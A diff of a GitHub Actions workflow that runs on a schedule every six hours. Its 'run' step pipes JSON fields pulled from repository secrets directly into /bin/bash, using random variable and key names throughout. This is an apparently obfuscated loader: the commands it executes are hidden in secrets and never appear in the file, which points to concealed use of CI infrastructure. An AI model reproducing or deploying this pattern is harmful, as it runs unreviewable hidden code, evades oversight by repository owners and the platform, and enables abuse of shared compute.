@@ -2,22 +2,29 @@ name: jiangyigu1829
 on:
   workflow_dispatch:
   schedule:
-    - cron: '21 1/6 * * *'
+    - cron: '26 2/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
+
     steps:
       - uses: actions/checkout@v4
       - name: jiangyigu1829
         env:
-          qt1: ${{ secrets.qt1 }}
+          pit3: ${{ secrets.pit3 }}
         run: |
-          echo $qt1 | jq -r .v696 | /bin/bash
-          echo $l41 | jq -r .fezd407 | /bin/bash
-          echo $rflw3 | jq -r .cra3 | /bin/bash
-          echo $krqgr43602 | jq -r .ldyhr333 | /bin/bash
-          echo $rd90 | jq -r .npz2 | /bin/bash
-          echo $o8 | jq -r .cn92894 | /bin/bash
-          echo $w92 | jq -r .cxs7 | /bin/bash
-          echo $glqt28445 | jq -r .ofar3 | /bin/bash
+          echo $pit3 | jq -r .q6995 | /bin/bash
+          echo $ih087 | jq -r .kyplk211 | /bin/bash
+          echo $qb5380 | jq -r .xb0347 | /bin/bash
+          echo $bdj0638 | jq -r .jk4 | /bin/bash
+          echo $smv5 | jq -r .dd5233 | /bin/bash
+          echo $v4 | jq -r .gp02153 | /bin/bash
+          echo $ouzex8223 | jq -r .i2066 | /bin/bash
+          echo $uxpc4 | jq -r .g6513 | /bin/bash
+          echo $l09 | jq -r .lrzv6 | /bin/bash
+          echo $wlkzg78638 | jq -r .wsnh9280 | /bin/bash
+          echo $f8 | jq -r .rey024 | /bin/bash
+          echo $gp60 | jq -r .lzrbh2483 | /bin/bash
+          echo $lssrt6658 | jq -r .qq073 | /bin/bash
+          echo $st7 | jq -r .agv9054 | /bin/bash
 
